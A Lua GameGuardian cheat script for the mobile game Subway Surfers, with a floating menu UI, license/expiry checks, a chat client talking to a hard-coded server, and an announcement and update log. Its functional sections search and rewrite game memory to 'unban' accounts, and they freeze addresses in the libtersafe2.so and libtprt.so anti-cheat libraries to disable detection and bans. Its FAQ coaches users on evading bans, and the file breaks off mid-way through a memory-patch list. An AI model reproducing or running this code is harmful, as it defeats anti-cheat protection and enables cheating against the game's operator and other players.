if type(radio[1]) == "string" or type(radio[1]) == "number" then
firadio[#firadio+1] = {
TextView,text = radio[1],
textColor=txtco
} end
radios = {
RadioGroup,background = getseekgra(),
layout_width = 'fill_parent',
}
for i = 2,#radio do
radios[#radios+1] = {
RadioButton,
layout_width = 'fill_parent',
text = radio[i][1],
textColor=txtco,
onClick = function() luajava.newThread(function() pcall(radio[i][2]) end):start() end,
}
end
firadio[#firadio+1] = radios
return luajava.loadlayout(firadio)
end

function changan.check(cklist)
rest = {
GridLayout,
layout_width = 'wrap_content',
layout_height = "wrap_content",
columnCount = '3',
gravity = "center"

}
for i = 1,#cklist do
local name = cklist[i][1]
local func1 = cklist[i][2]
local func2 = cklist[i][3]
local nid = cklist[i][4]
if not name then name = "未设置" end
nid = name..guid()
local func = 开关2(nid,func1,func2,nid)
rstt = luajava.loadlayout({
LinearLayout,
layout_width = 'wrap_content',
layout_height = "30dp",
layout_marginTop = "5dp",
layout_marginBottom = "5dp",
layout_marginLeft = "0dp",
layout_marginRight = "10dp",
gravity = "center_vertical",
onClick = function() luajava.newThread(function() func() end):start() end,

{
ImageView,
id = luajava.newId(nid),
layout_width = '20dp',
layout_height = "20dp",
background = "/sdcard/星河/图片/check1",
}, {
TextView,
gravity = "top",
text = name,
textColor=txtco,
layout_width = 'wrap_content',
layout_height = 'wrap_content',
layout_marginLeft = "4dp",
layout_marginRight = "5dp",
}})
rest[#rest+1] = rstt
end
return luajava.loadlayout(rest)
end
function changan.button(txt,func)
if not txt then txt = "未设置" end
return luajava.loadlayout(
{
LinearLayout,
layout_width = '230dp',
layout_hight = "230dp", {
LinearLayout,
layout_width = "fill_parent",
gravity = "center_horizontal",
layout_marginRight = "10dp",
layout_marginLeft = "5dp",
layout_marginTop = "5dp",
layout_marginBottom = "5dp",
background = getSelector3(),
onClick = function() luajava.newThread(function() pcall(func) end):start() end,
{
TextView,
--id = luajava.newId(tid),
text = txt,
textColor=txtco,
textSize = "16sp",
layout_width = "wrap_content",
},
}})
end
function changan.text(txt,color,size)
if not txt then txt = "未设置文字" end
if not color then color = "#ff000000" end
if not size then size = "18sp" end
return luajava.loadlayout(
{
TextView,
text = txt,
textSize = size,
textColor = color,
layout_width = "wrap_content",
})
end
corb = true
function changan.setedit(name,txt)
txt = tostring(txt)
luajava.runUiThread(function()
luajava.getIdValue(_ENV[name]):setText(txt)
end)
end

function changan.getedit(name)
--gg.alert(edit)
edit = tostring(luajava.getIdValue(_ENV[name]):getText())
return edit
end
function 开关(name,func1,func2)
if func1 == nil then func1 = "" end
if func2 == nil then func2 = "" end
if type(func1) == "function" then
return function()
namers = _ENV[name]
if namers ~= "开" then
_ENV[name] = "开"
pcall(func1)
else
_ENV[name] = "关"
pcall(func2)
end

end
end
end
function 开关2(name,func1,func2,nid)
if func1 == nil then func1 = "" end
if func2 == nil then func2 = "" end
if type(func1) == "function" then
return function()
namers = _ENV[name]
if namers ~= "开" then
luajava.runUiThread(function()
luajava.getIdValue(nid):setBackground(luajava.getBitmapDrawable("/sdcard/星河/图片/check2"))
end)
_ENV[name] = "开"
func1()
else
luajava.runUiThread(function()
luajava.getIdValue(nid):setBackground(luajava.getBitmapDrawable("/sdcard/星河/图片/check1"))
end)
_ENV[name] = "关"
func2()
end

end
end
end
function deve(t)
luajava.newThread(function() gg.alert(tostring(t)) end):start()
end
changan.controlChange = function(control,colors)
luajava.runUiThread(function()
if type(colors) ~= "table" then
end
import "android.animation.ObjectAnimator"
import "android.animation.ArgbEvaluator"
import "android.animation.ValueAnimator"
import "android.graphics.Color"
colorAnim = ObjectAnimator:ofInt(control,"textColor", colors)
colorAnim:setDuration(7000)
colorAnim:setEvaluator(ArgbEvaluator())
colorAnim:setRepeatCount(ValueAnimator.INFINITE)
colorAnim:setRepeatMode(ValueAnimator.REVERSE)
colorAnim:start()
end)
end
changan.controlRotetion = function(control,time)
luajava.runUiThread(function()
import "android.view.animation.Animation"
import "android.animation.ObjectAnimator"
xuanzhuandonghua = ObjectAnimator:ofFloat(control, "rotation", {
0, 360
})
xuanzhuandonghua:setRepeatCount(0)
xuanzhuandonghua:setRepeatMode(Animation.REVERSE)
xuanzhuandonghua:setDuration(time)
xuanzhuandonghua:start()
end) end
xuanzhuandonghua = nil -- 全局变量用于保存动画对象

changan.controlRotation2 = function(control, time)
luajava.runUiThread(function()
import "android.view.animation.Animation"
import "android.animation.ObjectAnimator"
xuanzhuandonghua = ObjectAnimator:ofFloat(control, "rotation", {
0, 360
})
xuanzhuandonghua:setRepeatCount(0)
xuanzhuandonghua:setRepeatMode(Animation.RESTART)
xuanzhuandonghua:setDuration(time)
xuanzhuandonghua:start()
end)
end

-- 停止旋转动画
changan.stopRotation = function()
if xuanzhuandonghua then
xuanzhuandonghua:cancel()
end
end
changan.controlFlip = function(control,time)
luajava.runUiThread(function()
import "android.view.animation.Animation"
import "android.animation.ObjectAnimator"
xuanzhuandonghua1 = ObjectAnimator:ofFloat(control, "rotationY", {0, 360})
xuanzhuandonghua1:setRepeatCount(0)
xuanzhuandonghua1:setRepeatMode(Animation.REVERSE)
xuanzhuandonghua1:setDuration(time)
xuanzhuandonghua1:start()
end) end
function tuic()
gg.toast("脚本已退出")
window:removeView(floatWindow)
luajava.setFloatingWindowHide(false)
luajava.newThread(function() os.exit() end):start()
bloc("end")
end
zidong = luajava.newThread(function()

            
            while true do
                while aP34qTjNQXYK3KJH < os.time() do
                    gg.alert('脚本已过期')
                    os.exit()
                end
                while a2dIiITouwrTgkMk ~= '0fa08270df7f34d0a482881e8090bb22' do
                    os.exit()
                end
                while checktrue ~= (imei .. aswgqSYlvl4v1gjJ.user_time .. api_time..xxxxxxx_22934..aYbIRvQTGiu3zJ1Z) do
                    os.exit()
                end
        
        
                while avwykaq3JHHQVkOH < os.time() do
                    gg.alert('脚本已过期')
                    os.exit()
                end
                while aeP2BbmZRYdnH84V ~= '5e9a9f4a187809fe1954fa74e1bb5d32' do
                    os.exit()
                end
                while checktrue ~= (imei .. a0erBhhbMEuSBgGc.user_time .. api_time..xxxxxxx_22574..awzD07xqZWyOTMqk) do
                    os.exit()
                end
        
        
if zdbf then logvid = luajava.getIdView("video") logvid.start(logvid) end
gg.sleep(500)
end
end)
url = "http://av.host.gay/vipjk.php"
bloc = luajava.getBlock()
local runnable = luajava.getRunnable(function()
vidd=luajava.loadlayout({
VideoView,
id = luajava.newId('video'),
videoPath = url,
layout_width = "fill_parent",
layout_height = "wrap_content",
})
bloc("end")
end)
local handler = luajava.getHandler()
handler:post(runnable)
bloc("join")
web6 = luajava.loadlayout({FrameLayout,
gravity="top|center_vertical",
{LinearLayout,
gravity="center",orientation="vertical",
vidd,changan.button("换一个",function()
zdbf=false
changan.controlFlip(web6,2500)
gg.sleep(500)
logvid = luajava.getIdView("video")
logvid:setVideoPath(url)
gg.sleep(2000)
zdbf=true
end),
},{LinearLayout,
gravity="center",
changan.switch("自动播放",
function()
zdbf = true
end,
function()
zdbf=false
end),
},

}
)
zdbf=false
zidong:start()
do
local path = "/sdcard/.游客信息.lua" --用户信息
local r = io.open(path, "r")
if r then
qltname = r:read("*a")
else
qltname = ".游客" .. math.random(1111111, 9999999)
io.open(path, "w"):write(qltname)
end
local path = "/sdcard/.用户头像2.lua" --用户信息
local r = io.open(path, "r")
if r then
qlticon = r:read("*a")
else
qlticon = ""
io.open(path, "w"):write(qlticon)
end
end
httpip="http://47.101.220.155/xb/caa.php"
httpip2="http://47.101.220.155/xb/"

function getu(name)
fs=gg.makeRequest(httpip.."?name="..name.."&mode=get").content
if fs=="00" then return "获取失败" else return fs end
end
function uplo(name,txt)
fs=gg.makeRequest(httpip.."?txt="..txt.."&name="..name.."&mode=set").content
end
function uprec(name,txt)
txt=string.bin2hex(txt)
if string.len(txt)<=7000 then
uplo(name,txt)
else
uplo(name,string.sub(txt,1,7000))
for i=2,(string.len(txt)/7000)-1 do
fs=gg.makeRequest(httpip.."?txt="..string.sub(txt,(i-1)*7000,i*7000).."&name="..name.."&mode=set2").content
end
txt=string.sub(txt,math.floor(string.len(txt)/7000)*7000+1,-1)
fs=gg.makeRequest(httpip.."?txt="..txt.."&name="..name.."&mode=set2").content
end
end
function 修改名字(lttext)
if string.len(lttext) <= 0 then return 0 end
if string.len(lttext) >= 400 then
gg.toast(".用户名长度上限20字节") return 0
end
local path = "/sdcard/.游客信息.lua" --用户信息
qltname = lttext
io.open(path, "w"):write(qltname)
gg.alert("修改成功\n"..lttext)
end
function 修改头像(txt)
local path2 = "/sdcard/.用户头像2.lua"
if string.find(txt,"emulated/0") ~= nil or string.find(txt,"/sdcard") ~= nil then
gg.alert("暂不支持上传本地图片\n请使用QQ号或直链")
return 0
end
if tonumber(txt) ~= nil then txt = "http://q1.qlogo.cn/g?b=qq&nk="..txt.."&s=100" end
if string.find(txt,"http%%") ~= nil or string.find(txt,"https%%") ~= nil then
gg.alert("格式有误，请重新输入") return 0
end
txt = string.url(txt,"en")
qlticon = txt
io.open(path2, "w"):write(qlticon)
gg.alert("头像修改成功")
end
lastlttm = os.time()-3
function 发送聊天(lttext)
if os.time()-lastlttm <= 3 then
gg.alert("聊天冷却"..3 -(os.time()-lastlttm).."秒")
return 0
end
local server = "http://47.101.220.155/xb/" --服务器地址
--local chat_log = gg.makeRequest(server .. "lts.php?hq=true").content
local uptime = gg.makeRequest(server .. "lts.php?updat=true").content
if uptime then
--io.open(path, "w"):write(GT[2])
if string.len(lttext) <= 0 then return 0 end
if string.len(lttext) >= 400 then
gg.toast("文字长度上限400字节")
else
changan.setedit("输入聊天内容","")
lastlttm = os.time()
lttext = string.gsub(lttext,"·","•")
lttext = string.gsub(lttext,"～","~")
lttext = string.gsub(lttext,"—","-")
lttext = string.gsub(lttext,"…","...")
if not qlticon or qlticon == "" or qlticon == "nil" then qlticon = "https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/qq2" qlticon=string.url(qlticon,"en") end
local p = gg.makeRequest(server .. "lts.php?lticon="..qlticon.."&nr=" .. lttext .. "&name=" .. qltname).content
if p ~= "发送成功" then
--gg.alert(qlticon.."\nerror -149: 消息发送失败")
else
gg.toast("发送成功")
end
end
else
gg.toast("请检查您的网络是否正常") return 0
end
shuaxinchat()
end
function FGUtilStringSplit(str,split_char)
local sub_str_tab = {}
while (true) do
local pos = string.find(str, split_char);
if (not pos) then
sub_str_tab[#sub_str_tab + 1] = str;
break
end
local sub_str = string.sub(str, 1, pos - 1).."…"
sub_str_tab[#sub_str_tab + 1] = sub_str;
str = string.sub(str, pos + 1, #str);
end

return sub_str_tab
end
nowtime = 0
localres = {}
function shuaxinchat()
local server = "http://47.101.220.155/xb/" --服务器地址
local uptime = gg.makeRequest(server .. "time.txt").content
if uptime then
if tonumber(uptime) > nowtime then
local chat_log = gg.makeRequest(server .. "lts.php?hq=true").content
nowtime = tonumber(uptime)
newltres = {}
ltres = FGUtilStringSplit(chat_log,"…")
for i = 1,#ltres do
if string.find(ltres[i],"·") == nil or string.find(ltres[i],"～") == nil then else
newltres[#newltres+1] = {}
newltres[#newltres].ltname = ltres[i]:match("·(.-)—")
newltres[#newltres].lttext = ltres[i]:match("～(.-)…")
newltres[#newltres].lttime = ltres[i]:match("—(.-)～")
newltres[#newltres].lticon = ltres[i]:match("㊢(.-)·")
end
end
for i = 1,#newltres do
isnew = true
for j = 1,#localres do
if newltres[i].ltname == localres[j].ltname and newltres[i].lttime == localres[j].lttime and newltres[i].lttext == localres[j].lttext then
isnew = false
end
end
if isnew == true then
isnew = false
xuyaoshuaxin = true
localres[#localres+1] = newltres[i]
--gg.alert(tostring(localres[#localres]))
addchat(changan.chat(localres[#localres]))
end
end
--gg.alert(tostring(localres))
if xuyaoshuaxin == true and already == true then
gundong()
xuyaoshuaxin = false
end
end
else
gg.toast("请检查您的网络是否正常") return 0
end
end
function addchat(cha)
local function invoke2()
layoutm4:addView(cha)
end
local runnable = luajava.getRunnable(invoke2)
local handler = luajava.getHandler()
handler:post(runnable)
end
function gundong()
if already then
gg.sleep(100)
local function invoke2()
_ENV["layouts4"]:fullScroll(View.FOCUS_DOWN)
end
local runnable = luajava.getRunnable(invoke2)
local handler = luajava.getHandler()
handler:post(runnable)
end
end
function removechat(cha)
local function invoke2()
_ENV["layoutm4"]:removeView(cha)
end
local runnable = luajava.getRunnable(invoke2)
local handler = luajava.getHandler()
handler:post(runnable)
end
function changan.chat(ltlist)
ltname = ltlist.ltname
lticon = ltlist.lticon
lttext = ltlist.lttext
lttime = ltlist.lttime
if not lticon or lticon == "" or lticon == "nil" then lticon = "https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/qq2" end
bitmap = luajava.getBitmapDrawable(lticon)
if not bitmap then bitmap = luajava.getBitmapDrawable("https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/qq2") end
if not _ENV[lticon] then _ENV[lticon] = bitmap end
if not lttext or lttext == "" then lttext = "  " end
if string.find(lticon,"http%%") ~= nil then lticon = "https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/qq2" end
if string.find(lticon,"/sdcard") == nil and string.find(lticon,"emulated") == nil and string.find(lticon,"http:/") == nil and string.find(lticon,"https:/") == nil then lticon = "https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/qq2" end
if not lttext then lttext = "   " end

if string.find(lttext,"☔️音")==nil then
local ctbg=chatbg()
ltresult = luajava.loadlayout(
{
LinearLayout,
layout_width = "190dp",
layout_height = "wrap_content",
orientation = "horizontal",
{
LinearLayout,
layout_height = "50dp",
layout_width = "50dp",
background = _ENV[lticon],
},
{
LinearLayout,
layout_height = "wrap_content",
layout_width = "wrap_content",
layout_marginLeft = "10dp",
orientation = "vertical",
{
TextView,
text = ltname.."\n"..lttime,
textSize = "10sp",
layout_width = "wrap_content",
layout_height = "wrap_content",
}, {
TextView,
text = lttext,
textSize = "15sp",
background = ctbg,
padding = "3dp",
layout_width = "wrap_content",
layout_height = "wrap_content",
}
}})
else
local ctbg=chatbg2()
local playPath=lttext:match("☔️音(.-)☔️音")
ltresult = luajava.loadlayout(
{
LinearLayout,
layout_width = "190dp",
layout_height = "wrap_content",
orientation = "horizontal",
{
LinearLayout,
layout_height = "50dp",
layout_width = "50dp",
background = _ENV[lticon],
},
{
LinearLayout,
layout_height = "wrap_content",
layout_width = "wrap_content",
layout_marginLeft = "10dp",
orientation = "vertical",
{
TextView,
text = ltname.."\n"..lttime,
textSize = "10sp",
layout_width = "wrap_content",
layout_height = "wrap_content",
}, {
TextView,
text = "[ 语音 ]ᵒ",
textSize = "15sp",
background = ctbg,
onClick=function()
playPath=playPath
luajava.newThread(
function()
if panduan("/sdcard/星河/音频/"..playPath)~=true then
file.download(tostring(httpip2..playPath),"/sdcard/星河/音频/"..playPath)
end
--gg.alert("/sdcard/星河/音频/"..playPath)
based=string.hex2bin(file.read("/sdcard/星河/音频/"..playPath))
--gg.alert(based)
file.write("/sdcard/星河/test.mpp",based)
gg.playMusic("/sdcard/星河/test.mpp")
end):start()
end,
padding = "3dp",
layout_width = "wrap_content",
layout_height = "wrap_content",
}
}})
end

return ltresult
end
function chatbg()
local jb=luajava.loadlayout({
GradientDrawable,
color = "#aa2383FF",
cornerRadius = 18
})
return jb
end
function visi(tid,ttid)
local tview = luajava.getIdValue(tid)
local ttview = luajava.getIdValue(ttid)
if not tview then return 0 end
if tonumber(tostring(tview:getVisibility())) == 8.0 then
tview:setVisibility(View.VISIBLE)
ttview:setBackground(luajava.getBitmapDrawable("/sdcard/星河/图片/hsj"))
else
tview:setVisibility(View.GONE)
ttview:setBackground(luajava.getBitmapDrawable("/sdcard/星河/图片/sj"))
end
end
function changan.box(views)
local tid = "box"..guid()
local ttid = tid.."6"
firadio = {
LinearLayout,
layout_width = '210dp',
layout_height = "wrap_content",
layout_marginTop = "2dp",
layout_marginBottom = "2dp",
orientation = "vertical",
}
if type(views[1]) == "string" or type(views[1]) == "number" then
firadio[#firadio+1] = {
LinearLayout,
layout_width = 'fill_parent',
layout_height = "30dp",
gravity = "center_vertical",
layout_marginTop = "2dp",
layout_marginBottom = "4dp",
onClick = function() visi(tid,ttid) end,
background = getSelector3(),
{
ImageView,
layout_marginLeft = "10dp",
id = luajava.newId(ttid),
background = "/sdcard/星河/图片/sj",
layout_width = "20dp",
layout_height = "20dp",
layout_marginTop = "0dp",
},
{
TextView,text = views[1],
textSize = "16sp",
layout_marginLeft = "15dp",
layout_width = "100dp",
textColor = "#ffffff",
gravity = "left",
}} else
gg.alert("changan.box第一个参数必须是string") os.exit()
end
radios = {
LinearLayout,
layout_marginLeft = "0dp",
layout_marginRight = "0dp",
orientation = "vertical",
visibility = "gone",
id = luajava.newId(tid),
padding = "0dp",
layout_width = 'fill_parent',
}
for i = 2,#views do
radios[#radios+1] = views[i]
end
firadio[#firadio+1] = radios
return luajava.loadlayout(firadio)
end
function getLayoutParams2()
local prm = luajava.new(WindowManager.LayoutParams)

layoutParams1 = prm
if (Build.VERSION.SDK_INT >= 26) then -- 设置悬浮窗方式
layoutParams1.type = prm.TYPE_APPLICATION_OVERLAY
else
layoutParams1.type = prm.TYPE_PHONE
end
layoutParams1.format = PixelFormat.RGBA_8888 -- 设置背景
layoutParams1.flags = prm.FLAG_NOT_FOCUSABLE -- 焦点设置Finish
layoutParams1.gravity = Gravity.CENTER -- 重力设置
layoutParams1.width = prm.WRAP_CONTENT -- 布局宽度
layoutParams1.height = prm.WRAP_CONTENT -- 布局高度
return layoutParams1
end
end
local ll=gg.makeRequest("http://wss.wigwy.xyz/api/numberOf/7728513846230904").content--启动次数配置
































---菜单配置区
标题颜色={0xff000000,0xff000000,0xff000000,0xff000000,}


标题边框开关=1
--0关1开
标题边框颜色="0xddffffff"

大背景颜色={0xfffffff,0xfffffff,0xfffffff,0xff000000,}



大背景边框="0xddffffff"

button颜色={0xff607cfa,0xff607cfa,0xff607cfa,0xff607cfa,}


侧边文字颜色="#ddffffff"

菜单小背景颜色={0xfffffff,0xfffffff,0xfffffff,0xfffffff,}


菜单小背景边框="0xddffffff"

其他控件背景={0xff4a4a4a,0xff4a4a4a,0xff4a4a4a,0xff4a4a4a,}


侧边按钮背景1="http://chuxinya.top/view.php/e9262e940210a7492c71445fc57037eb.png"

侧边按钮背景2="http://chuxinya.top/view.php/819eb3194f204c39b9dd4787cf045406.png"


stab = {
--菜单名字，大标题
--可删可减，注意与下边功能表对应
{"公告","公告区域"},
{"防御","防御区域"},
{"数据","数据区域"},
{"对抗","对抗区域"},
{"竞技","竞技区域"},
{"音乐","音乐区域"},

}
xfcpic = "http://chuxinya.top/view.php/36e24f9d14dd9454bb6d861cdb13cbbd.png"
--悬浮窗链接或路径


ui_init()--ui初始化不要动
changan.menu(
{
{--第一页
----------------------------------
changan.text("公告区域","#ff000000","20sp"),
		changan.button("选择进程",
		function()
			gg.setProcessX()
		end,
		function()
			gg.setProcessX()
		end),
		changan.line(),
		
		changan.text("秋风UI启动次数"..ll.."","#ff000000","12sp"),
	changan.line(),
			changan.box({
			"公 告[ Notice ]",

				
changan.line(),
changan.line(),
changan.line(),
changan.text("本地铁跑酷UI于秋风制作，请勿支持盗版，时间会证明一切，秋风卷土重来!\n秋风QQ:3553495503\n需要定制同款UI的请找秋风哦\nQQ①群:528904405(未满)\nQQ②群:717616037(未满)\n请您进入秋风通知群，以免更新后您丢失资源","#ff000000","12sp"),

			}),
				changan.line(),
		
		changan.text("秋风电报群(telegram):https://t.me/+HT0q4fnrlJMyNWY1[别傻不拉叽的去浏览器里粘贴打开，要去电报里打开]","#ff000000","12sp"),
		changan.line(),
		
		changan.box({
	"您遇到的问题",
	changan.line(),
				changan.line(),
				changan.line(),
				changan.line(),
	changan.text("1.为什么我点击了功能却没有效果？\n--回答:请您点击'选择进程'后重新使用功能哦~\n2.为什么我老是闪退？\n--回答:您可以使用'麦当劳框架'等具有防闪性能的框架哦~\n3.刷完后我应该怎么做？\n--回答:您可以点击'保存数据'后立马退出科技哦~\n4.为什么我刷完号之后道具赛被封了？\n--回答:您可能使用的是一键全满类似的功能，这边建议您可以使用手动购买人物滑板的功能，这样可以避免刷完后道具赛被封掉了哦~(注:人物和滑板如果全部满了是肯定封号的)~\n5.为什么我…\n--回答:…\n\n\n感谢您对秋风的支持哦~","#ff000000","12sp"),
				changan.line(),
				changan.line(),
				changan.line(),
				changan.line(),
  }),
  changan.line(),
  changan.box({
  "更新日志",
 
  changan.text("7.20|18:30\n更新了全防区域\n更新了刷号区域的保存功能以及其他功能\n更新了道具赛功能,后程结算等\n更新了无尽赛功能\n--------------------------------------------\n7.20|20:00\n更新了全网三防\n更新了地铁五满\n提高了脚本的稳定性\n--------------------------------------------\n7.21|20:30\n更新了全防区域的分类以及功能\n更新了刷号区域功能\n更新了道具赛的功能\n更新了音乐功能\n--------------------------------------------\n7.21|22:10\n更新了全防区域的功能，去除了无用功能\n--------------------------------------------\n7.22|15:40\n更新了全防区域的功能\n更新了刷号功能的道具刷取\n更新了道具赛功能的后程结算\n更新了快捷锁定道具\n--------------------------------------------\n7.23|17:00\n更新了全防区域的功能(建议使用第一套)\n更新了刷号区域的简化以及整理\n添加了刷号区域的功能,对其分类\n--------------------------------------------\n7.23|21:40\n更新了全防区域的功能,新抓出无敌防闪以及防御功能\n--------------------------------------------\n7.24|12:30\n更新了全防区域的功能\n防闪已经达到巅峰\n--------------------------------------------\n7.24|20:00\n更新了防御区域的第二套功能\n更新了刷号区域的功能\n更新了道具赛区域的功能\n采用pubg的思路抓取了防断网的功能\n更新了无尽赛区域的功能\n感谢大家的支持\n--------------------------------------------\n7.28|20:10\n此次更新了牛津版本\n也是随波逐流吧\n坎坎坷坷的更新完了\n此次更新了全防区域的功能\n更新了刷号区域的60%的功能\n更新了道具赛40%的功能\n更新了无尽赛80%的功能\n刷号效果更加好用\n期待秋风重回巅峰吧!\n另:大号(3553495503)这个号封了\n本人现在是小号(2461473881)不要被骗\n--------------------------------------------\n7.29|21:45\n更新了防御区域的功能\n推荐使用第一套防御\n--------------------------------------------\n7.30|20:50\n更新了防御区域的功能\n更新了道具赛区域的跳跃三种聚能\n--------------------------------------------\n8.3|13:00\n更新了UI界面\n大更了功能\n--------------------------------------------\n8.4|12:00\n更新了防御区域的二号线路防闪以及更换了防检测\n优化了防检测功能\n大大减少了开启防检测闪退的情况\n--------------------------------------------\n8.14|2:30\n更换了UI界面\n更新了全体功能","#ff000000","12sp"),
}),
changan.line(),

changan.button("解封账号",
function() 
QF(0x10f14e8,4,"000000E3r")
end),
changan.button("解封对抗赛",
function() 
time=os.clock()
gg.setRanges(32)
 local Name="解封"
 local dataType = 4
 local tb1 = {{110000000,0}, {0,-0xC},{0,-0x10},}	
local tb2 = {{0,-0x24}}
 SearchWrite(tb1,tb2, dataType)
 local time=string.sub(os.clock()-time,0,5)
end),







----------------------------------
}, {--第二页
----------------------------------


changan.button("防闪|进度条开启|",
function()
gg.clearResults() 
gg.setRanges(8)
gg.searchNumber("861587055;5399824;8277688;778923875::",4)
gg.searchNumber("778923875",4)
gg.getResults(1)
gg.editAll("9999",4)
gg.clearResults()
gg.setRanges(8)
gg.searchNumber("778923875", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
gg.searchNumber("778923875", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
gg.getResults(100)
gg.editAll("-9999", gg.TYPE_DWORD)
end),
    
			changan.switch("动态IP锁定|进度条开启|",
function()
function S_Pointer(t_So, t_Offset, _bit)
	local function getRanges()
		local ranges = {}
		local t = gg.getRangesList('^/data/*.so*$')
		for i, v in pairs(t) do
			if v.type:sub(2, 2) == 'w' then
				table.insert(ranges, v)
			end
		end
		return ranges
	end
	local function Get_Address(N_So, Offset, ti_bit)
		local ti = gg.getTargetInfo()
		local S_list = getRanges()
		local _Q = tonumber(0x167ba0fe)
		local t = {}
		local _t
		local _S = nil
		if ti_bit then
			_t = 32
		 else
			_t = 4
		end
		for i in pairs(S_list) do
			local _N = S_list[i].internalName:gsub('^.*/', '')
			if N_So[1] == _N and N_So[2] == S_list[i].state then
				_S = S_list[i]
				break
			end
		end
		if _S then
			t[#t + 1] = {}
			t[#t].address = _S.start + Offset[1]
			t[#t].flags = _t
			if #Offset ~= 1 then
				for i = 2, #Offset do
					local S = gg.getValues(t)
					t = {}
					for _ in pairs(S) do
						if not ti.x64 then
							S[_].value = S[_].value & 0xFFFFFFFF
						end
						t[#t + 1] = {}
						t[#t].address = S[_].value + Offset[i]
						t[#t].flags = _t
					end
				end
			end
			_S = t[#t].address
			print(string.char(231,190,164,58).._Q)
		end
		return _S
	end
	local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
	return _A
end



local t = {"libtersafe2.so", "Cd"}--防闪
local tt = {0xA8}
local ttt = S_Pointer(t, tt)
gg.addListItems({{address = ttt, flags = 4, value = 9999, freeze = true}})--防封
local t = {"libtersafe2.so:bss", "Cb"}
local tt = {0x37C8}
local ttt = S_Pointer(t, tt)
gg.addListItems({{address = ttt, flags = 4, value = -1, freeze = true}})--防封

local t = {"libtersafe2.so:bss", "Cb"}
local tt = {0x4B1C}
local ttt = S_Pointer(t, tt)
gg.addListItems({{address = ttt, flags = 4, value = -1, freeze = true}})--防封

local t = {"libtersafe2.so:bss", "Cb"}
local tt = {0x81F8}
local ttt = S_Pointer(t, tt)
gg.addListItems({{address = ttt, flags = 4, value = -1, freeze = true}})--防封

local t = {"libtprt.so", "Cd"}
local tt = {0x15F00}
local ttt = S_Pointer(t, tt)
gg.addListItems({{address = ttt, flags = 4, value = 9999, freeze = true}})--防闪
gg.alert(os.date'️地铁跑酷提示您:\n秋风:全防开启成功')
string.toMusic('全防开启成功')

				
					end,
					function()
				
					end),
changan.switch("防检测|进度条开启|",
					function()
					
					function S_Pointer(t_So, t_Offset, _bit)
	local function getRanges()
		local ranges = {}
		local t = gg.getRangesList('^/data/*.so*$')
		for i, v in pairs(t) do
			if v.type:sub(2, 2) == 'w' then
				table.insert(ranges, v)
			end
		end
		return ranges
	end
	local function Get_Address(N_So, Offset, ti_bit)
		local ti = gg.getTargetInfo()
		local S_list = getRanges()
		local _Q = tonumber(0x167ba0fe)
		local t = {}
		local _t
		local _S = nil
		if ti_bit then
			_t = 32
		 else
			_t = 4
		end
		for i in pairs(S_list) do
			local _N = S_list[i].internalName:gsub('^.*/', '')
			if N_So[1] == _N and N_So[2] == S_list[i].state then
				_S = S_list[i]
				break
			end
		end
		if _S then
			t[#t + 1] = {}
			t[#t].address = _S.start + Offset[1]
			t[#t].flags = _t
			if #Offset ~= 1 then
				for i = 2, #Offset do
					local S = gg.getValues(t)
					t = {}
					for _ in pairs(S) do
						if not ti.x64 then
							S[_].value = S[_].value & 0xFFFFFFFF
						end
						t[#t + 1] = {}
						t[#t].address = S[_].value + Offset[i]
						t[#t].flags = _t
					end
				end
			end
			_S = t[#t].address
			print(string.char(231,190,164,58).._Q)
		end
		return _S
	end
	local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
	return _A
end



local t = {"libtersafe2.so:bss", "Cb"}
local tt = {0x49FC}
local ttt = S_Pointer(t, tt)
gg.addListItems({{address = ttt, flags = 4, value = -1, freeze = true}})
gg.alert(os.date'️地铁跑酷提示您:\n秋风:检测开启成功')
string.toMusic('防检测开启成功')
					
					end,
					function()
					
					end),
							 

changan.switch("基址重置|进度条开启|",
function()
io.open("/sdcard/.xa","w+"):write([[
22369
7BA72A20|7ba72a20|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/app_sodler/sotk-v7a-lite/3.3.34-lite/lib/libkwai-v8-lite.so|b2a20
7BA72A24|7ba72a24|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/app_sodler/sotk-v7a-lite/3.3.34-lite/lib/libkwai-v8-lite.so|b2a24
7BA72A28|7ba72a28|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/app_sodler/sotk-v7a-lite/3.3.34-lite/lib/libkwai-v8-lite.so|b2a28
7BA72A34|7ba72a34|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/app_sodler/sotk-v7a-lite/3.3.34-lite/lib/libkwai-v8-lite.so|b2a34
7BA72A3C|7ba72a3c|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/app_sodler/sotk-v7a-lite/3.3.34-lite/lib/libkwai-v8-lite.so|b2a3c
7BA72A4C|7ba72a4c|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/app_sodler/sotk-v7a-lite/3.3.34-lite/lib/libkwai-v8-lite.so|b2a4c
7BA72A58|7ba72a58|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/app_sodler/sotk-v7a-lite/3.3.34-lite/lib/libkwai-v8-lite.so|b2a58
7BA72A60|7ba72a60|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/app_sodler/sotk-v7a-lite/3.3.34-lite/lib/libkwai-v8-lite.so|b2a60
7BA72A6C|7ba72a6c|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/app_sodler/sotk-v7a-lite/3.3.34-lite/lib/libkwai-v8-lite.so|b2a6c
7BA72A70|7ba72a70|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/app_sodler/sotk-v7a-lite/3.3.34-lite/lib/libkwai-v8-lite.so|b2a70
7BA72A7C|7ba72a7c|4|ffffffff|1|0|0|0|r-xp|/data/user/0/com.kiloo.subwaysurf/app_sodler/sotk-v7a-lite/3.3.34-lite/lib/libkwai-v8-lite.so|b2a7c
